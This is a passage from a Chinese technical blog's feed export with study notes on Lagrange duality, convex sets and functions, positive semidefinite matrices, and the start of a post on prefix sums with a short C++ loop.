src="https://math.now.sh?inline=f_0%28x%5E*%29" style="display:inline-block;margin: 0;"/>记为<img src="https://math.now.sh?inline=p%5E*" style="display:inline-block;margin: 0;"/>，则对于任意的<img src="https://math.now.sh?inline=%5Clambda%2C%20%5Cnu" style="display:inline-block;margin: 0;"/>，有：<img src="https://math.now.sh?inline=g%28%5Clambda%2C%20%5Cnu%29%20%5Cle%20p%5E*" style="display:inline-block;margin: 0;"/>，即：原始问题的最优解所对应的函数值是拉格朗日对偶函数的上确界。</p><p>可以将上述的性质理解为：<strong>拉格朗日对偶函数的函数值不会超过原始问题的最优解所对应的函数值</strong>。为什么这样说呢？上述性质是怎样来的呢？应该给出证明。设<img src="https://math.now.sh?inline=%5Ctilde%7Bx%7D" style="display:inline-block;margin: 0;"/>是任意一个可行解，<img src="https://math.now.sh?inline=%5Clambda%20%5Cge%200%2C%20%5Cnu%20%5Cge%200" style="display:inline-block;margin: 0;"/>，<img src="https://math.now.sh?inline=g_i%28%5Ctilde%7Bx%7D%29%20%5Cge%200%2C%20h_j(%5Ctilde%7Bx%7D)%20%3D%200" style="display:inline-block;margin: 0;"/>，有：</p><p style=""><img src="https://math.now.sh?from=%5Cbegin%7Bequation%7D%20%5Cbegin%7Baligned%7D%20L%28%5Ctilde%7Bx%7D%2C%20%5Clambda%2C%20%5Cnu%29%20%26%3D%20f_0(%5Ctilde%7Bx%7D)%20%2B%20%5Clambda%5Csum%5E%7Bm%7D_%7Bi%20%3D%201%7Dg_i(%5Ctilde%7Bx%7D)%20%2B%20%5Cnu%5Csum%5E%7Bn%7D_%7Bj%20%3D%201%7Dh_j(%5Ctilde%7Bx%7D)%2C%20%5Clambda%20%5Cge%200%2C%20%5Cnu%20%5Cge%200%20%5C%5C%20%26%3D%20f_0(%5Ctilde%7Bx%7D)%20%2B%20%5Clambda%5Csum%5E%7Bm%7D_%7Bi%20%3D%201%7Dg_i(x)%20%5C%5C%20%26%5Cle%20f_0(%5Ctilde%7Bx%7D)%20%5Cend%7Baligned%7D%20%5Cend%7Bequation%7D%0A" /></p><p>又根据下确界的定义（可以将下确界从效果上大致理解为最小值，虽然它两个还有细微的差别，但是可以直观上这么理解，可以暂时将其理解为最小值定义），得到：</p><p style=""><img src="https://math.now.sh?from=%5Cbegin%7Bequation%7D%20%5Cbegin%7Baligned%7D%20L%28%5Ctilde%7Bx%7D%2C%20%5Clambda%2C%20%5Cnu%29%20%5Cge%20%20%5Cinf_xL(x%2C%20%5Clambda%2C%20%5Cnu)%20%26%3D%5Cinf_x%5Bf_0(x)%20%2B%20%5Clambda%5Csum%5E%7Bm%7D_%7Bi%20%3D%201%7Dg_i(x)%20%2B%20%5Cnu%5Csum%5E%7Bn%7D_%7Bj%20%3D%201%7Dh_j(x)%5D%20%5C%5C%20%26%3D%20g(%5Clambda%2C%20%5Cnu)%20%5Cend%7Baligned%7D%20%5Cend%7Bequation%7D%0A" /></p><p>将上述不等式联立起来，即可得到：<img src="https://math.now.sh?inline=g%28%5Clambda%2C%20%5Cnu%29%20%5Cle%20L(%5Ctilde%7Bx%7D%2C%20%5Clambda%2C%20%5Cnu)%20%5Cle%20f_0(%5Ctilde%7Bx%7D)" style="display:inline-block;margin: 0;"/>。即：对于任意一个可行解，拉格朗日的最大值都不会超过原始问题的函数值。所以将<img src="https://math.now.sh?inline=%5Ctilde%7Bx%7D" style="display:inline-block;margin: 0;"/>换为最优解<img src="https://math.now.sh?inline=x%5E*" style="display:inline-block;margin: 0;"/>后，命题得证。</p><p><img src="https://raw.githubusercontent.com/m-Onst/pics/main/blog/202108/Gap%20between%20primal%20and%20dual.png" alt=""></p><p>根据Lower Bound Property，求解原始问题的最优解，其实就是<strong>相当于求解拉格朗日对偶问题的最大值</strong>。由于对于仿射函数，它既是凸函数又是凹函数，所以我们<strong>倾向于将仿射函数看做是一个凹函数</strong>（因为大多数情况下都是凹函数求最大值，凸函数求最小值）。</p><p>所以**拉格朗日对偶函数构成了原始问题的最优点的函数值<img src="https://math.now.sh?inline=p%5E*%20%3D%20f_0%28x%5E*%29" style="display:inline-block;margin: 0;"/>的下界。**而其最好的解就是与原始问题的最优解的函数值是相等的，但是也可能不会相等，那么什么时候相等，什么时候又不相等呢？这就需要一个新的判断标准，这就涉及到了Strong and Weak Duality.</p><h3 id="Strong-and-Weak-Duality">Strong and Weak Duality</h3><p>设<img src="https://math.now.sh?inline=p%5E*" style="display:inline-block;margin: 0;"/>是Primal Optimal，<img src="https://math.now.sh?inline=d%5E*" style="display:inline-block;margin: 0;"/>是Dual Optimal，则：</p><ul><li><img src="https://math.now.sh?inline=p%5E*%20%5Cge%20d%5E*" style="display:inline-block;margin: 0;"/>是一定成立的</li><li><img src="https://math.now.sh?inline=p%5E*%20%3D%20d%5E*" style="display:inline-block;margin: 0;"/>是不一定成立的</li></ul><p>对于<img src="https://math.now.sh?inline=p%5E*%20%3D%20d%5E*" style="display:inline-block;margin: 0;"/>称为强对偶性（Strong Duality），而<img src="https://math.now.sh?inline=p%5E*%20%5Cge%20d%5E*" style="display:inline-block;margin: 0;"/>称为弱对偶性（Weak Duality）。对于强对偶性来说：</p><ul><li><strong>一般情况</strong>下是不成立的</li><li>在凸函数下<strong>一般</strong>会成立</li><li>对于非凸函数来说，<strong>有时候</strong>会成立</li></ul><p>对于强对偶性成立的优化问题来说，求得对偶问题的最优解后，不用再做调整，可以直接作为原问题的最优解来使用；而对于弱对偶性来说，还需要对对偶问题的解做一系列调整才能用作原问题的解。</p><p>那么到底什么时候，具有强对偶性呢？需要满足Slater’s Conditions.</p><p><strong>Slater’s Conditons</strong></p><p>对于一般优化问题的标准形式而言：</p><p style=""><img src="https://math.now.sh?from=%5Cbegin%7Bequation%7D%20%5Cbegin%7Baligned%7D%20%5Cmin%20%5Cquad%20%26f_0%28x%29%20%5C%5C%20s.t.%20%5Cquad%20%20%26g_i(x)%20%26%5Cle%200%2C%20%26i%20%3D%20%5C%7B1%2C%202%2C%203%2C%20...%2C%20m%5C%7D%20%5C%5C%20%26h_j(x)%20%26%3D0%2C%20%26j%20%3D%20%5C%7B1%2C%202%2C%203%2C%20...%2C%20n%5C%7D%20%5Cend%7Baligned%7D%20%5Cend%7Bequation%7D%0A" /></p><p>如果<strong>存在可行解<img src="https://math.now.sh?inline=%5Ctilde%7Bx%7D" style="display:inline-block;margin: 0;"/>，使得<img src="https://math.now.sh?inline=g_i%28%5Ctilde%7Bx%7D%29" style="display:inline-block;margin: 0;"/>严格小于0成立，<img src="https://math.now.sh?inline=h_j%28%5Ctilde%7Bx%7D%29%20%3D%200" style="display:inline-block;margin: 0;"/>严格成立，*<em>这个条件称为Slater条件*</em>。</strong></p><p><strong>Slater定理 - 用来判断强对偶性是否成立</strong></p><p>如果原始问题（Primal Problem）是凸优化问题，且Slater条件成立，则强对偶性成立。即：它描述的是：<strong>当Slater条件成立且原问题是凸优化问题时，强对偶性成立</strong>。</p><h3 id="Complementary-Slackness">Complementary Slackness</h3><p>假设强对偶性成立（Strong Duality），<img src="https://math.now.sh?inline=x%5E*" style="display:inline-block;margin: 0;"/>是Primal Optimal，<img src="https://math.now.sh?inline=%5Clambda%5E*%2C%20%5Cnu%5E*" style="display:inline-block;margin: 0;"/>是Dual Optimal，根据Lower Bound Property有：</p><p style=""><img src="https://math.now.sh?from=%5Cbegin%7Baligned%7D%20f_0%28x%5E*%29%20%3D%20g(%5Clambda%5E*%2C%20%5Cnu%5E*)%20%26%3D%20%5Cinf_x%5Bf_0(x)%20%2B%20%5Clambda%5E*%20%5Csum%5E%7Bm%7D_%7Bi%20%3D%201%7Dg_i(x)%20%2B%20%5Cnu%5E*%5Csum%5E%7Bn%7D_%7Bj%20%3D%201%7Dh_j(x)%5D%20%5C%5C%26%5Cle%20%20L(x%5E*%2C%20%5Clambda%5E*%2C%20%5Cnu%5E*)%20%3D%20f_0(x%5E*)%20%2B%20%5Clambda%5E*%5Csum%5E%7Bm%7D_%7Bi%20%3D%201%7Dg_i(x%5E*)%20%2B%20%5Cnu%5E*%5Csum%5E%7Bn%7D_%7Bj%20%3D%201%7Dh_j(x%5E*)%20%5C%5C%26%5Cle%20f_0(x%5E*)%20%5Cend%7Baligned%7D%0A" /></p><p>即：<img src="https://math.now.sh?inline=f_0%28x%5E*%29%20%5Cle%20f_0(x%5E*)" style="display:inline-block;margin: 0;"/>。而要想左式成立，则必须要有<img src="https://math.now.sh?inline=%5Clambda%5E*%5Csum%5E%7Bm%7D_%7Bi%20%3D%201%7Dg_i%28x%29%20%3D%200" style="display:inline-block;margin: 0;"/>。又因为对于<img src="https://math.now.sh?inline=g_i%28x%29" style="display:inline-block;margin: 0;"/>来说，每一项都是非正的，所有<img src="https://math.now.sh?inline=%5Clambda%5E*%5Csum%5E%7Bm%7D_%7Bi%20%3D%201%7Dg_i%28x%29%20%3D%200" style="display:inline-block;margin: 0;"/>等价于<img src="https://math.now.sh?inline=%5Clambda%5E*g_i%28x%29%20%3D%200" style="display:inline-block;margin: 0;"/></p><p style=""><img src="https://math.now.sh?from=%5Cbegin%7Bcases%7D%20%5Clambda%5E*%20%3D0%2C%20g_i%28x%29%20%5Cle%200%20%5C%5C%20%5Clambda%5E*%20%3E%200%2C%20g_i(x)%20%3D%200%20%5Cend%7Bcases%7D%0A" /></p><p>也就是说：当强对偶性成立时，<img src="https://math.now.sh?inline=x%5E*" style="display:inline-block;margin: 0;"/>是原问题的最优解，如果<img src="https://math.now.sh?inline=%5Clambda%5E*%2C%20%5Cnu%5E*" style="display:inline-block;margin: 0;"/>是对偶问题的最优解的必须满足的必要条件（上述的条件<img src="https://math.now.sh?inline=%5Clambda%5E*g_i%28x%29%3D0" style="display:inline-block;margin: 0;"/>）称为互补松弛条件。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;涉及到的知识点&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Lower bound property&lt;/li&gt;
&lt;li&gt;Strong and Weak Duality&lt;/li&gt;
&lt;li&gt;Complementary Slackness&lt;/li&gt;
&lt;li&gt;KKT Conditions&lt;/li</summary>
      
    
    
    
    <category term="机器学习" scheme="https://4st.tech/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="对偶" scheme="https://4st.tech/tags/%E5%AF%B9%E5%81%B6/"/>
    
    <category term="拉格朗日对偶" scheme="https://4st.tech/tags/%E6%8B%89%E6%A0%BC%E6%9C%97%E6%97%A5%E5%AF%B9%E5%81%B6/"/>
    
    <category term="互补松弛条件" scheme="https://4st.tech/tags/%E4%BA%92%E8%A1%A5%E6%9D%BE%E5%BC%9B%E6%9D%A1%E4%BB%B6/"/>
    
    <category term="强对偶性" scheme="https://4st.tech/tags/%E5%BC%BA%E5%AF%B9%E5%81%B6%E6%80%A7/"/>
    
    <category term="弱对偶性" scheme="https://4st.tech/tags/%E5%BC%B1%E5%AF%B9%E5%81%B6%E6%80%A7/"/>
    
    <category term="Duality" scheme="https://4st.tech/tags/Duality/"/>
    
    <category term="Lower bound property" scheme="https://4st.tech/tags/Lower-bound-property/"/>
    
    <category term="Strong and Weak Duality" scheme="https://4st.tech/tags/Strong-and-Weak-Duality/"/>
    
    <category term="Complementary Slackness" scheme="https://4st.tech/tags/Complementary-Slackness/"/>
    
    <category term="KKT Conditions" scheme="https://4st.tech/tags/KKT-Conditions/"/>
    
  </entry>
  
  <entry>
    <title>机器学习：凸集和凸函数</title>
    <link href="https://4st.tech/2021/08/14/ji-qi-xue-xi-tu-ji-he-tu-han-shu/"/>
    <id>https://4st.tech/2021/08/14/ji-qi-xue-xi-tu-ji-he-tu-han-shu/</id>
    <published>2021-08-14T09:34:13.000Z</published>
    <updated>2021-08-14T12:44:19.162Z</updated>
    
    <content type="html"><![CDATA[<h1>优化</h1><h2 id="一般优化问题">一般优化问题</h2><p>机器学习中的问题基本上都是优化问题。那么什么是优化问题呢：</p><ul><li>构造一个合适的目标函数，使得这个目标函数取到极值时的解就是你要求的东西</li><li>找到一个能让这个目标函数取到极值的解的方法</li></ul><p>即<code>机器学习 = 模型 + 优化</code>，其中模型就是我们要求解的目标；优化就是能够求解这个目标的方法。</p><p>将上述的概念可以类比数据结构和算法的关系。我们知道<code>程序 = 数据结构 + 算法</code>，数据结构是研究数据如何在计算机中组织和存储的；而算法是在这些数据结构之上的操作。有了这两方面的东西，才有了我们的程序，这与<code>机器学习 = 模型 + 优化</code>的概念基本上是一致的。</p><p>任何一个优化问题，都可以写为：</p><p style=""><img src="https://math.now.sh?from=minmize%20%5Cspace%20f_0%28x%29%20%5C%5Cs.t.%20%5Cspace%20f_i(x)%20%5Cle%200%2Ci%20%3D%20%5C%7B1%2C%202%2C%20...%2C%20K%5C%7D%5C%5C%20g_j(x)%3D0%2C%20j%20%3D%20%5C%7B1%2C%202%2C%203%2C%20...%2C%20L%5C%7D%0A" /></p><p>其中<img src="https://math.now.sh?inline=f_0%28x%29" style="display:inline-block;margin: 0;"/>就是我们要求解的<strong>目标函数</strong>，<img src="https://math.now.sh?inline=f_i%28x%29%20%5Cle%200%2Cg_j(x)%20%3D%200" style="display:inline-block;margin: 0;"/>是目标函数<img src="https://math.now.sh?inline=f_0%28x%29" style="display:inline-block;margin: 0;"/>的<strong>约束条件</strong>，满足这些约束条件的点<img src="https://math.now.sh?inline=x" style="display:inline-block;margin: 0;"/>叫做<strong>可行解</strong>（<code>Feasible Solution</code>）。我们要做的就是在可行解集中找到一个解，使得目标函数取得最小值，这个解称为<strong>最优解</strong>。</p><p>上述的优化问题的写法是一般优化问题的<strong>标准形式</strong>，<strong>在这个标准形式中，没有做出任何假设</strong>，即：没有对这个目标函数做任何的假设，也没有假设目标函数所受到的约束条件中的函数是什么类型的函数。它们可以是凸函数也可以是非凸函数、可以是连续的函数也可以是离散的函数等等。</p><h2 id="优化的分类">优化的分类</h2><p>有了优化问题的标准形式之后，就需要判断优化目标——目标函数它属于什么类别。因为对于不同的类别有不同的处理方法。</p><p>在优化领域通常会将优化问题分为四个方面：</p><ul><li><strong>凸的和非凸的</strong></li><li>光滑和非光滑</li><li>连续和离散</li><li>有约束条件和无约束条件</li></ul><p>机器学习主要关注的是凸优化问题。因为凸优化问题有一个很好的性质，就是：<strong>局部最优解就是全局最优解</strong>；而对于非凸优化问题来说，局部最优解不一定就是全局最优解。所以对于非凸优化问题来说，我们追求的是找到更好的局部最优解（<code>Better Local Optimal</code>）</p><p>对于非凸优化问题来说，常常有以下三种解决方法：</p><ul><li>如果非凸优化问题简单，可以硬解出来，如：<code>Bruce Force</code></li><li>如果可以通过松弛<code>Relax</code>等方法，将非凸优化问题转为凸优化问题，来求解这个凸优化问题。当把这个凸优化问题求解完毕之后，对求解出来的凸优化问题的解来做一些改进得到非凸优化问题的解。</li><li>通过常规的算法进行求解，但是求解出来的一定是一个局部最优解（<code>Local Optimal</code>）</li></ul><h2 id="优化问题的通用解决思路">优化问题的通用解决思路</h2><ol><li>首先确定问题所涉及到的参数 <code>Decision Variable</code></li><li>确定目标并写出目标函数 <code>Objective Function</code></li><li>判断是否约束条件，如果有，将所有的约束条件写出来 <code>Constraints</code></li><li>判断优化问题所属的分类，一般判断其是否是凸优化问题 <code>Convex</code></li><li>使用或设计求解器<code>Solver</code></li></ol><h1>凸优化问题</h1><p>假设给定的优化问题是如下的标准形式：</p><p style=""><img src="https://math.now.sh?from=minmize%20%5Cspace%20f_0%28x%29%20%5C%5Cs.t.%20%5Cspace%20f_i(x)%20%5Cle%200%2Ci%20%3D%20%5C%7B1%2C%202%2C%20...%2C%20K%5C%7D%5C%5C%20g_j(x)%3D0%2C%20j%20%3D%20%5C%7B1%2C%202%2C%203%2C%20...%2C%20L%5C%7D%0A" /></p><p>那么什么样的问题是凸优化问题呢？即：给定一个标准形式的优化问题，如何判断它属不属于凸优化问题呢？</p><p>要解决上述问题，就需要回归概念：<strong>需要关注目标函数的定义域和值域是什么样子的</strong>。</p><h2 id="凸集">凸集</h2><h3 id="定义">定义</h3><p>定义：假设对于<img src="https://math.now.sh?inline=%5Cforall%20x%2C%20y%20%5Cin%20C" style="display:inline-block;margin: 0;"/>，并且对<img src="https://math.now.sh?inline=%5Cforall%20%5Calpha%20%5Cin%20%5B0%2C%201%5D" style="display:inline-block;margin: 0;"/>，均有<img src="https://math.now.sh?inline=%5Calpha%20x%20%2B%281%20-%20%5Calpha%29y%20%5Cin%20C" style="display:inline-block;margin: 0;"/>，则集合<img src="https://math.now.sh?inline=C" style="display:inline-block;margin: 0;"/>是凸集。</p><p>上述定义描述的是什么意思呢？简单来说，就是集合<img src="https://math.now.sh?inline=C" style="display:inline-block;margin: 0;"/>中任意两点之间的直线段上的点都属于集合<img src="https://math.now.sh?inline=C" style="display:inline-block;margin: 0;"/>。怎么看出来的呢？利用控制变量法。当<img src="https://math.now.sh?inline=x%2C%20y" style="display:inline-block;margin: 0;"/>都给定了的时候，它们就是一个常量了，不会随着<img src="https://math.now.sh?inline=%5Calpha" style="display:inline-block;margin: 0;"/>的变化而变化了。所以<img src="https://math.now.sh?inline=%5Calpha%20x%20%2B%20%281%20-%20%5Calpha%29y" style="display:inline-block;margin: 0;"/>只有一个自变量<img src="https://math.now.sh?inline=%5Calpha" style="display:inline-block;margin: 0;"/>，令<img src="https://math.now.sh?inline=z%20%3D%20%5Calpha%20x%20%2B%20%281%20-%20%5Calpha%29y" style="display:inline-block;margin: 0;"/>，有：</p><p style=""><img src="https://math.now.sh?from=z%20%3D%20%5Calpha%20x%20%2B%20%281%20-%20%5Calpha%29y%20%5C%5C%20%3D%20%5Calpha%20x%20%2B%20y%20-%20%5Calpha%20y%20%5C%5C%20%3D%20(x%20-%20y)%5Calpha%20%2B%20y%2C%20%5Calpha%20%5Cin%20%5B0%2C%201%5D%0A" /></p><p>根据上式，只有一个自变量，其表示的是一条直线；又因为自变量<img src="https://math.now.sh?inline=%5Calpha" style="display:inline-block;margin: 0;"/>是属于闭区间<img src="https://math.now.sh?inline=%5B0%2C%201%5D" style="display:inline-block;margin: 0;"/>的，当<img src="https://math.now.sh?inline=%5Calpha%20%3D%200" style="display:inline-block;margin: 0;"/>时，<img src="https://math.now.sh?inline=z%20%3D%20y" style="display:inline-block;margin: 0;"/>；当<img src="https://math.now.sh?inline=%5Calpha%20%3D%201" style="display:inline-block;margin: 0;"/>时，<img src="https://math.now.sh?inline=z%20%3D%20x" style="display:inline-block;margin: 0;"/>。所以上述式子表示的是在点<img src="https://math.now.sh?inline=x%2C%20y" style="display:inline-block;margin: 0;"/>之间的直线段上的所有点。而<img src="https://math.now.sh?inline=%5Calpha%20x%20%2B%281%20-%20%5Calpha%29y%2C%20%5Calpha%20%5Cin%20%5B0%2C%201%5D" style="display:inline-block;margin: 0;"/>​它构成了一个新的向量，这个向量还有一个名字，叫做<strong>凸组合</strong>。</p><p>凸集的定义保证了：<strong>在这个集合中的任意一个加权凸组合后的点仍然在这个集合内，这个性质保证了在计算过程中不会出可行域</strong>。</p><h3 id="一个重要定理">一个重要定理</h3><p>两个凸集的交集还是凸集。</p><p>这个定理是一个重要的定理，在掌握了常用的凸集之后，在判断一个优化问题的可行域是否是凸集时就简化了。因为优化问题的可行域是满足各个约束条件的点的集合，它是一个交集。所以如果构成这个可行域的满足各个约束条件的点的集合它是一个凸集，那么这个可行域也一定是一个凸集。</p><h3 id="常见的凸集">常见的凸集</h3><ul><li>所有的<img src="https://math.now.sh?inline=R%5En" style="display:inline-block;margin: 0;"/></li><li>所有的正数集合<img src="https://math.now.sh?inline=R_%2B%5En" style="display:inline-block;margin: 0;"/></li><li>范数<img src="https://math.now.sh?inline=%7C%7Cx%7C%7C%20%5Cle%201" style="display:inline-block;margin: 0;"/></li><li>仿集：线性方程组的所有解<img src="https://math.now.sh?inline=Ax%20%3D%20b" style="display:inline-block;margin: 0;"/></li><li>半空间</li></ul><h2 id="凸函数">凸函数</h2><h3 id="定义-2">定义</h3><p>函数的定义域<img src="https://math.now.sh?inline=domf" style="display:inline-block;margin: 0;"/>为凸集，对于定义域中任意的两点<img src="https://math.now.sh?inline=x%2C%20y" style="display:inline-block;margin: 0;"/>，函数满足：<img src="https://math.now.sh?inline=f%28%5Ctheta%20x%20%2B%20(1-%5Ctheta%29y)%20%5Cle%20%5Ctheta%20f(x)%20%2B%20(1%20-%20%5Ctheta)f(y)%2C%20%5Cforall%5Ctheta%20%5Cin%20%5B0%2C%201%5D" style="display:inline-block;margin: 0;"/>，则称该函数为凸函数。</p><p>上述定义描述的是什么呢？描述的是：<strong>过一个下凸函数上任意两点所作割线一定在这两点间的函数图象的上方</strong>。至于为什么是割线（直线段）的原因与凸集中如何看出来是直线段的方法是一样的， 不再赘述。</p><p>具体来看上述不等式（这个不等式又叫做<code>琴生不等式</code>），不等式两侧的<img src="https://math.now.sh?inline=%5Ctheta" style="display:inline-block;margin: 0;"/>是同一个值，也就是说对于给定的两点<img src="https://math.now.sh?inline=x%2C%20y" style="display:inline-block;margin: 0;"/>和给定的一个确定的<img src="https://math.now.sh?inline=%5Ctheta" style="display:inline-block;margin: 0;"/>值，其比较的是同一个位置上的割线上的函数值和下凸函数上的函数值的大小。随着<img src="https://math.now.sh?inline=%5Ctheta" style="display:inline-block;margin: 0;"/>不断改变，取遍<img src="https://math.now.sh?inline=%5B0%2C%201%5D" style="display:inline-block;margin: 0;"/>上的所有值，其也就把割线上的所有点和与之对应的下凸函数上的函数值都比较了一遍，根据几何性质可以得到上述结果，即：凸函数上任意两点所做的割线一定在这两点间的函数图像的上方。</p><p>从函数定义域和值域的角度上来看：给定的函数的定义域是凸集；函数的值域也是一个凸集。</p><h3 id="凸函数的一个重要性质">凸函数的一个重要性质</h3><p>若干个凸函数的非负加权后，得到的新的函数仍然是一个凸函数，即：<strong>若干个凸函数的非负加权和仍然是一个凸函数（权值是非负数，即要求权值要大于等于0）</strong>。</p><h3 id="凸函数的判别方法">凸函数的判别方法</h3><h4 id="判断凸函数的一阶条件——充要条件">判断凸函数的一阶条件——充要条件</h4><p>设<img src="https://math.now.sh?inline=f%3A%20R%5En%20%5Cto%20R" style="display:inline-block;margin: 0;"/>是可导的，则<img src="https://math.now.sh?inline=f" style="display:inline-block;margin: 0;"/>为凸函数，当且仅当<img src="https://math.now.sh?inline=f%28y%29%20%5Cge%20f(x)%20%2B%20%5Cnabla%20f(x)%5ET%20(y%20-%20x)" style="display:inline-block;margin: 0;"/>对于<img src="https://math.now.sh?inline=%5Cforall%20x%2C%20y%20%5Cin%20domf" style="display:inline-block;margin: 0;"/>成立且<img src="https://math.now.sh?inline=domf" style="display:inline-block;margin: 0;"/>是凸集</p><p>上述一阶条件要验证：</p><ol><li>定义域<img src="https://math.now.sh?inline=domf" style="display:inline-block;margin: 0;"/>是凸集</li><li>对于<img src="https://math.now.sh?inline=%5Cforall%20x%2C%20y%20%5Cin%20domf" style="display:inline-block;margin: 0;"/>，不等式<img src="https://math.now.sh?inline=f%28y%29%20%5Cge%20f(x)%20%2B%20%5Cnabla%20f(x)%5ET%20(y%20-%20x)" style="display:inline-block;margin: 0;"/>成立</li></ol><p>上述定理的证明可以使用泰勒公式来进行证明，上述公式描述的是：<strong>下凸函数在<img src="https://math.now.sh?inline=x" style="display:inline-block;margin: 0;"/>点的附近点y处的函数值不小于以<img src="https://math.now.sh?inline=x" style="display:inline-block;margin: 0;"/>点为切点的切线上的函数值</strong>。</p><h4 id="判断凸函数的二阶条件">判断凸函数的二阶条件</h4><p>设<img src="https://math.now.sh?inline=f%3A%20R%5En%20%5Cto%20R" style="display:inline-block;margin: 0;"/>是二阶可导的，则<img src="https://math.now.sh?inline=f" style="display:inline-block;margin: 0;"/>为凸函数，当且仅当<img src="https://math.now.sh?inline=%5Cnabla%5E2f%28x%29%20%5Csucceq%200" style="display:inline-block;margin: 0;"/>对于<img src="https://math.now.sh?inline=%5Cforall%20x%2C%20y%20%5Cin%20domf" style="display:inline-block;margin: 0;"/>成立且<img src="https://math.now.sh?inline=domf" style="display:inline-block;margin: 0;"/>是凸集</p><p>上述二阶条件要验证：</p><ol><li>定义域<img src="https://math.now.sh?inline=domf" style="display:inline-block;margin: 0;"/>是凸集</li><li>对于<img src="https://math.now.sh?inline=%5Cforall%20x%2C%20y%20%5Cin%20domf" style="display:inline-block;margin: 0;"/>，<img src="https://math.now.sh?inline=%5Cnabla%5E2f%28x%29" style="display:inline-block;margin: 0;"/>​是半正定的（<code>Positive-semidefinit</code> ，PSD）</li></ol><p>对于二阶条件的证明可以使用带有拉格朗日余项的泰勒公式来进行证明。</p><h1>补充知识点：半正定矩阵</h1><h2 id="半正定矩阵的定义">半正定矩阵的定义</h2><p>一个矩阵是半正定的定义是：对于任意的实非零向量<img src="https://math.now.sh?inline=v" style="display:inline-block;margin: 0;"/>，如果实对称矩阵<img src="https://math.now.sh?inline=M" style="display:inline-block;margin: 0;"/>满足<img src="https://math.now.sh?inline=v%5ETMv%20%5Cge%200" style="display:inline-block;margin: 0;"/>，则矩阵<img src="https://math.now.sh?inline=M" style="display:inline-block;margin: 0;"/>是半正定矩阵。</p><h2 id="判断一个矩阵是否是半正定矩阵">判断一个矩阵是否是半正定矩阵</h2><p>判断一个矩阵是半正定矩阵可以通过定义去判断，也可以使用一些判定条件来进行判断：</p><ol><li>需要注意的是：对于半正定矩阵来说，顺序主子式非负并不能推出矩阵是半正定的，而应该将相应的条件改为<strong>所有的主子式非负（而不仅仅是顺序主子式非负）</strong>。</li><li>如果一个矩阵的所有特征值均不小于0，则该矩阵是半正定矩阵</li></ol><h2 id="半正定矩阵的性质">半正定矩阵的性质</h2><ol><li>半正定矩阵的行列式是非负的；</li><li>两个半正定矩阵的和是半正定的；</li><li>非负实数与半正定矩阵的数乘矩阵是半正定的。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;优化&lt;/h1&gt;
&lt;h2 id=&quot;一般优化问题&quot;&gt;一般优化问题&lt;/h2&gt;
&lt;p&gt;机器学习中的问题基本上都是优化问题。那么什么是优化问题呢：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;构造一个合适的目标函数，使得这个目标函数取到极值时的解就是你要求的东西&lt;/li&gt;
&lt;li&gt;找到一个能让这个目</summary>
      
    
    
    
    <category term="机器学习" scheme="https://4st.tech/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="机器学习" scheme="https://4st.tech/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="优化" scheme="https://4st.tech/tags/%E4%BC%98%E5%8C%96/"/>
    
    <category term="凸优化" scheme="https://4st.tech/tags/%E5%87%B8%E4%BC%98%E5%8C%96/"/>
    
    <category term="凸集" scheme="https://4st.tech/tags/%E5%87%B8%E9%9B%86/"/>
    
    <category term="凸函数" scheme="https://4st.tech/tags/%E5%87%B8%E5%87%BD%E6%95%B0/"/>
    
    <category term="半正定矩阵" scheme="https://4st.tech/tags/%E5%8D%8A%E6%AD%A3%E5%AE%9A%E7%9F%A9%E9%98%B5/"/>
    
    <category term="优化问题的解决思路" scheme="https://4st.tech/tags/%E4%BC%98%E5%8C%96%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3%E6%80%9D%E8%B7%AF/"/>
    
  </entry>
  
  <entry>
    <title>基础算法：前缀和与差分</title>
    <link href="https://4st.tech/2021/08/12/ji-chu-suan-fa-qian-zhui-he-yu-chai-fen/"/>
    <id>https://4st.tech/2021/08/12/ji-chu-suan-fa-qian-zhui-he-yu-chai-fen/</id>
    <published>2021-08-12T09:26:19.000Z</published>
    <updated>2021-08-14T03:58:02.636Z</updated>
    
    <content type="html"><![CDATA[<h1>前缀和与差分</h1><p>设原数组为A，其中的第i个元素为<img src="https://math.now.sh?inline=a_i" style="display:inline-block;margin: 0;"/>，则前缀和数组的第i个位置的元素<img src="https://math.now.sh?inline=S_i%20%3D%20a_1%20%2B%20a_2%20%2B%20...%20%2B%20a_i" style="display:inline-block;margin: 0;"/>，即：前缀和数组中的第i个元素等于原数组中前i个（下标从1开始）的和。</p><p>这里需要注意的是：对于前缀和数组来说，下标一定要从1开始而不是从0开始。</p><p>有两个问题：</p><ol><li>如何求前缀和数组中的第i个元素<img src="https://math.now.sh?inline=S_i" style="display:inline-block;margin: 0;"/>？</li><li>前缀和数组中的元素<img src="https://math.now.sh?inline=S_i" style="display:inline-block;margin: 0;"/>是用来做什么用的？有什么作用？</li></ol><h1>前缀和</h1><h2 id="一维数组的前缀和">一维数组的前缀和</h2><h3 id="求元素S-i">求元素<img src="https://math.now.sh?inline=S_i" style="display:inline-block;margin: 0;"/></h3><p>将边界值<img src="https://math.now.sh?inline=S_0" style="display:inline-block;margin: 0;"/>设为0，则可以使用迭代公式：<img src="https://math.now.sh?inline=S_i%20%3D%20S_%7Bi-1%7D%20%2B%20a_i" style="display:inline-block;margin: 0;"/>即可计算出来，其代码为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">  S[i] = S[i - <span class="number">1</span>] + A[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是，<strong>如果使用上述公式来求元素<img src="https://math.now.sh?inline=S_i" style="display:inline-block;margin: 0;"/>的话，那么在输入阶段，原始数组的下标也要从0挪到从1开始</strong>。</p><p><strong>前缀和中的第0个元素为什么要设计成值为0，并且前缀和数组的下标是从1开始的</strong>？原因是为了统一操作，将求原数组中某一区间内的元素和的公式统一，不用处理边界值，不用再进行条件判断而设置的哨兵节点。</p><h3 